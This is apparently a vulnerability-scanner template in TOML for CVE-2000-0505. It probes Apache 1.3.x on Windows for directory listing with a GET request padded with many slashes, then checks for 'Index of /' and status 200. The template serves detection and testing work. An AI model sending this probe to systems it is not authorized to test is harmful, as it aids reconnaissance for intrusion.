[info]
author = "ave"
description = "验证 Apache 1.3.x Windows 版本目录遍历漏洞，发送包含大量斜杠的 HTTP GET 请求，检测是返回目录列表"
id = "POC-AVE-2000-0422"
name = "CVE-2000-0505 PoC"
severity = "medium"
tags = ["ave-2000-0422"]
vuln_id = [
    "CVE-2000-0505",
    "AVE-2000-0422",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}////////////////////////"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["Index of /"]

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
